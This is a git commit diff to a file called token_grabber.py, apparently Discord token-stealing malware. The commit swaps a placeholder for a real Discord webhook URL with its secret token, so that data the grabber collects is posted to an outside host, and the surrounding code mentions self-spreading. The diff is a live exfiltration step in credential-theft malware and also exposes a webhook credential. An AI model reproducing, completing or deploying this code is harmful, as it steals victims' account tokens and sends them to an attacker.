a0ae51e1f8062792c4880bb8c560fae298b16e4e
xocamy <131361667+xocamy@users.noreply.github.com>
2023-06-09 17:38:05 -0700

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1116888871779700787/hNt6KuqxoBRozAF7aZrhiCWfc0FJf_--CFQ5El25YqjEJ0GRRio812EfQk0Ku7qRrn2H", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
